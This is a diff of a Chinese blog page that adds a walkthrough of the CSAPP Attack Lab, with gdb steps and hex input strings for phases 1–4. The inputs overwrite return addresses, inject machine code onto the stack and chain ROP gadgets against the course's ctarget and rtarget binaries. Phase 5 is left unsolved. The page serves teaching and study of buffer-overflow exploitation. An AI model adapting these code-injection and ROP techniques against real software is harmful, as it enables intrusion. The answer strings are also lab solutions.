@@ -27,14 +27,23 @@
 <meta property="og:site_name" content="青山依旧在">
 <meta property="og:description" content="尝试找到操作系统和服务器的安全漏洞，然后用不同的方法利用漏洞破坏程序。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pkunicor.github.io/2023/03/18/15-54-47/WX20230609-103056@2x.png">
+<meta property="og:image" content="https://pkunicor.github.io/2023/03/18/15-54-47/WX20230609-103332@2x.png">
+<meta property="og:image" content="https://pkunicor.github.io/2023/03/18/15-54-47/WX20230609-102814@2x.png">
+<meta property="og:image" content="https://pkunicor.github.io/2023/03/18/15-54-47/WX20230609-104729@2x.png">
+<meta property="og:image" content="https://pkunicor.github.io/2023/03/18/15-54-47/WX20230609-123834@2x.png">
+<meta property="og:image" content="https://pkunicor.github.io/2023/03/18/15-54-47/WX20230609-130233@2x.png">
+<meta property="og:image" content="https://pkunicor.github.io/2023/03/18/15-54-47/WX20230609-140230@2x.png">
+<meta property="og:image" content="https://pkunicor.github.io/2023/03/18/15-54-47/WX20230609-140336@2x.png">
 <meta property="article:published_time" content="2023-03-18T07:54:47.000Z">
-<meta property="article:modified_time" content="2023-06-08T03:42:56.748Z">
+<meta property="article:modified_time" content="2023-06-09T06:56:00.783Z">
 <meta property="article:author" content="yao">
 <meta property="article:tag" content="csapp">
 <meta property="article:tag" content="shell">
 <meta property="article:tag" content="gdb">
 <meta property="article:tag" content="objdump">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pkunicor.github.io/2023/03/18/15-54-47/WX20230609-103056@2x.png">
 
 
 <link rel="canonical" href="https://pkunicor.github.io/2023/03/18/15-54-47/">
@@ -144,7 +153,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%B3%BB%E5%88%97"><span class="nav-number">1.</span> <span class="nav-text">系列</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%BB%E5%8A%A1%E7%9B%AE%E6%A0%87"><span class="nav-number">2.</span> <span class="nav-text">任务目标</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9"><span class="nav-number">3.</span> <span class="nav-text">相关内容</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%A7%A3%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">题目及解法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">4.1.</span> <span class="nav-text">思路</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%B3%BB%E5%88%97"><span class="nav-number">1.</span> <span class="nav-text">系列</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%BB%E5%8A%A1%E7%9B%AE%E6%A0%87"><span class="nav-number">2.</span> <span class="nav-text">任务目标</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9"><span class="nav-number">3.</span> <span class="nav-text">相关内容</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%A7%A3%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">题目及解法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">4.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-1"><span class="nav-number">4.2.</span> <span class="nav-text">Phase 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-2"><span class="nav-number">4.3.</span> <span class="nav-text">Phase 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-3"><span class="nav-number">4.4.</span> <span class="nav-text">Phase 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-4"><span class="nav-number">4.5.</span> <span class="nav-text">Phase 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-5"><span class="nav-number">4.6.</span> <span class="nav-text">Phase 5</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -241,7 +250,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-06-08 11:42:56" itemprop="dateModified" datetime="2023-06-08T11:42:56+08:00">2023-06-08</time>
+      <time title="修改时间：2023-06-09 14:56:00" itemprop="dateModified" datetime="2023-06-09T14:56:00+08:00">2023-06-09</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -290,10 +299,92 @@
 <h1 id="任务目标"><a href="#任务目标" class="headerlink" title="任务目标"></a>任务目标</h1><p>Attack Lab实验，采用 code-injection 和 return-oriented 两种方法攻击程序。</p>
 <h1 id="相关内容"><a href="#相关内容" class="headerlink" title="相关内容"></a>相关内容</h1><ol>
 <li><code>./ctarget -q</code>：运行目标文件用参数<code>-q</code>，不使用服务器</li>
+<li><code>-i FILE</code>: 文件输入</li>
+<li><code>./hex2raw &lt; 1.txt | ./ctarget -q</code>: 答案不换行，用<code>hex2raw</code>转换成字符串，注意需要用小端存储。</li>
+<li><code>call</code>指令会将8个字节的<code>rip</code>值入栈，作为<code>ret</code>返回地址。</li>
 <li>code-injection：关闭了栈随机化，栈不可执行和canary。</li>
 <li>return-oriented：打开栈随机化和不可执行，关闭canary。</li>
 </ol>
-<h1 id="题目及解法"><a href="#题目及解法" class="headerlink" title="题目及解法"></a>题目及解法</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2>
+<h1 id="题目及解法"><a href="#题目及解法" class="headerlink" title="题目及解法"></a>题目及解法</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>和课程中讲解的两种漏洞的破解方式相同：代码注入利用缓冲区溢出，把需要执行的指令输入到栈中。面向返回编程将需要的指令片段返回地址输入到缓冲区中，模拟一个程序计数器，顺序执行需要执行的指令。由于bomb实验对每一条汇编命令都进行了解释，这个实验就不逐条解释了，把之前做过的答案重新整理一遍。</p>
+<h2 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h2><p>思路：第一个很简单输入函数开辟了0x28的空间用于保存输入,返回地址在rsp+0x28的位置,所以输入一段0x28字节的字符串后面跟上返回touch1的地址,注意地址是小端存放:<code>C0 17 40 00 00 00 00 00 </code>, 以下答案为了方便观看添加了换行，运行程序时需要去掉换行。</p>
+<ol>
+<li><p>gdb进入程序，对test函数反汇编：</p>
+<img src="/2023/03/18/15-54-47/WX20230609-103056@2x.png" class="">
+</li>
+<li><p>调用了getbuf函数，可以查看一下汇编代码，找出缓冲区的大小</p>
+<img src="/2023/03/18/15-54-47/WX20230609-103332@2x.png" class="">
+</li>
+<li><p>缓冲区大小为<code>0x28</code>，40个字节，输入的字符串保存在当前<code>rsp</code>处。然后输入40个字节无用数据，充满缓冲区，继续输入8个字节的touch1地址，覆盖掉原地址。</p>
+</li>
+<li><p>对要跳转的touch1函数反汇编，找一下函数入口地址：</p>
+<img src="/2023/03/18/15-54-47/WX20230609-102814@2x.png" class="">
+</li>
+<li><p>所以需要返回的地址为<code>0x00000000004017c0</code>，输入小端存放。</p>
+</li>
+</ol>
+<p>答案：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">c0 <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h2><p>思路：</p>
+<p>第二个需要注入可执行代码, 需要把touch2的参数寄存器<code>rdi</code>内容设置为cookie, 这样重置ret到touch2才能正确执行, 所有第一次在getbuf中把返回值重置为一个栈地址, 然后在这个地址内写入一系列操作, 每次ret后返回地址会自动退栈, 所以先把<code>rsp</code>-8, 然后在<code>rdi</code>写入touch2的地址,然后将<code>rdi</code>写入<code>rsp</code>指向的栈地址中,然后把cookie值写入<code>rdi</code>中,最后ret。</p>
+<ol>
+<li><p>先查看一下touch2函数的入口在哪里：</p>
+<img src="/2023/03/18/15-54-47/WX20230609-104729@2x.png" class="">
+</li>
+<li><p>可以看到需要返回地址为<code>0x00000000004017ec</code>， 参数可以进入touch2函数打印一下那个局部变量的值，也可以在上一个题目输出信息那里看到，我的cookie值为<code>0x59b997fa</code>。</p>
+</li>
+<li><p>这次需要让指令在栈中执行，所以需要知道getbuf时<code>%rsp</code>的值，可以在test处打断点，<code>display $rsp</code>，值为<code>$rsp = (void *) 0x5561dcb0</code>。test函数中分配8个字节，call getbuf 时使用了8个字节，getbuf分配40个字节，一共分配了56个字节，所以在我们输入字符串时，<code>rsp</code>指向的地址值应该是<code>0x5561dc78</code></p>
+</li>
+<li><p>接下来就是注入一段需要运行的代码，可以先写汇编代码，通过指令<code>gcc -c foo.s</code>，生成二进制代码<code>foo.o</code>， 在通过<code>objdump -d foo.o</code>反汇编，生成可读的机器指令。</p>
+</li>
+</ol>
+<p>答案：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>           <span class="comment">/*  sub    $0x8,%rsp */</span></span><br><span class="line"><span class="number">48</span> c7 c7 ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span>  <span class="comment">/*  mov    $0x4017ec,%rdi */</span></span><br><span class="line"><span class="number">48</span> <span class="number">89</span> <span class="number">3</span>c <span class="number">24</span>           <span class="comment">/*  mov    %rdi,(%rsp) */</span></span><br><span class="line"><span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span>  <span class="comment">/*  mov    $0x59b997fa,%rdi   -   set cookie */</span></span><br><span class="line">c3                    <span class="comment">/*  retq  */</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span></span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="comment">/* return adress, execute exploit code */</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase 3"></a>Phase 3</h2><p>思路：</p>
+<p>第三题和第二题基本相同return到touch3后要进行一次cookie对比,第二题是十六进制的数字对比,可以提前把cookie写入<code>rdi</code>寄存器里,但是第三题的参数是一个字符串指针,所以要把字符串地址写入<code>rsi</code>第二个参数寄存器里,不能用在栈中写,因为后面还有两次函数调用,栈空间很容易被覆盖,找了一下变量cookie的地址,这个地址<code>0x6044e4</code>的后面有很长一段地址没有使用过,所以可以把字符串写入<code>0x6044ec</code>,<code>rsi</code>的参数传递在<code>0x6044ec</code>,还有一个地方是字符串<code>0x59b997fa</code>,每个字符存在一个字节里,一共需要8个字节的空间,可以用<code>mov</code>,写入十六进制数,但是要注意字符串大端存放,数字是小端存放,翻转一下就可以了.</p>
+<ol>
+<li><p>根据实验指南中提示的函数<code>hexmatch</code>, 做了一个字符串对比，第二个参数是字符串地址，而且在函数中将传入的cookie值转换成了一个随机地址的字符串，然后进行字符串对比，所以我们需要提前把字符串写入到固定的地址，然参数传进去。</p>
+</li>
+<li><p><code>disas touch3</code></p>
+<img src="/2023/03/18/15-54-47/WX20230609-123834@2x.png" class="">
+</li>
+<li><p>可以看出cookie值存在内存的<code>0x6044e4</code>处，打印一下周围的内存值，<code>x/6xg</code></p>
+<img src="/2023/03/18/15-54-47/WX20230609-130233@2x.png" class="">
+</li>
+<li><p>上面可以看到后面有一部分是没有使用的内存，选一个<code>0x6044ec</code>，把我们的字符串写入这里，注意大端存放。</p>
+</li>
+<li><p>接下来注入要运行的指令，和上一题相同，但是要把字符串写入到选定的地址里，字符串<code>59b997fa</code>转换为16进制为<code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61</code>，但是要注意小端存放的值为<code>0x6166373939623935</code>，所以写入这个值，当做字符串读出时刚好是cookie值。<code>movabs</code>：用于64位立即数赋值。</p>
+</li>
+</ol>
+<p>答案：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>           <span class="comment">/*  sub    $0x8,%rsp */</span></span><br><span class="line">bf fa <span class="number">18</span> <span class="number">40</span> <span class="number">00</span>        <span class="comment">/*  mov    $0x4018fa,%edi */</span></span><br><span class="line"><span class="number">48</span> <span class="number">89</span> <span class="number">3</span>c <span class="number">24</span>           <span class="comment">/*  mov    %rdi,(%rsp) */</span></span><br><span class="line">bf ec <span class="number">44</span> <span class="number">60</span> <span class="number">00</span>        <span class="comment">/*  mov    $0x6044ec,%edi  */</span></span><br><span class="line"><span class="number">48</span> be <span class="number">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span>  </span><br><span class="line"><span class="number">37</span> <span class="number">66</span> <span class="number">61</span>              <span class="comment">/*  movabs $0x6166373939623935,%rsi */</span></span><br><span class="line"><span class="number">48</span> <span class="number">89</span> <span class="number">37</span>              <span class="comment">/*  mov    %rsi,(%rdi)    */</span></span><br><span class="line">c3                    <span class="comment">/*  retq  */</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span></span><br><span class="line"><span class="number">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="comment">/* return adress, execute exploit code */</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h2><p>思路：</p>
+<p>第四题,和第二题相同,需要把代码返回到touch2里面,但是不能像phase2中代码注入运行代码,因为栈内标记为不可执行了,所以要使用ROP的方法来操作,在给出的gadget中选择两个连续的48 89 c7 c3, mov %rax,%rdi,   还有一个58 c3, popq %rax,将这两条指令的地址用栈溢出的方法写到返回里,在返回地址中间加上cookie码。</p>
+<ol>
+<li><p><em><strong><code>gcc -c farm.c</code>：生成目标文件<br><code>objdump -d farm.o &gt; farm.s</code>：反汇编生成可读指令<br><code>这里需要注意优化级别为 -Og，与实验的优化级别相同</code></strong></em><br><code>objdump -d rtarget.o &gt; rtarget.s</code>：直接对可执行文件反汇编生成的指令带地址，更方便看一些。</p>
+</li>
+<li><p>在<code>rtarget.s</code>中找我们需要的指令，</p>
+</li>
+<li><p><code>setval_426</code>函数中有：地址为<code>4019c5</code></p>
+<img src="/2023/03/18/15-54-47/WX20230609-140230@2x.png" class="">
+</li>
+<li><p>找到我们需要的<code>48 89 c7</code>，后续的<code>90</code>是一个nop，什么也不做，计数器加1，最后跟着<code>c3</code>ret。</p>
+</li>
+<li><p>上面把<code>rax</code>的值存到<code>rdi</code>中了，接下来我们就是找一个pop指令<code>58 90 c3</code>，退栈到<code>rax</code>中，找到<code>getval_280</code>：地址为<code>4019cc</code></p>
+<img src="/2023/03/18/15-54-47/WX20230609-140336@2x.png" class="">
+</li>
+<li><p>所以溢出的输入为退栈到<code>rax</code>，栈顶是cookie值，然后执行<code>0x4019c5</code>的mov指令，最后返回touch2。注意所有的操作都是8字节。</p>
+</li>
+</ol>
+<p>答案：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>   <span class="comment">/*40个字节溢出  */</span></span><br><span class="line">cc <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">c5 <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase 5"></a>Phase 5</h2><p>思路：</p>
+<p>和Phase 3相同，但是要把代码注入改为target序列执行指令，可能需要对寄存器的低字节进行操作，还没想出怎么做这个题目，后面有时间了再来做。</p>
+<p>答案：</p>
+
     </div>
 
     
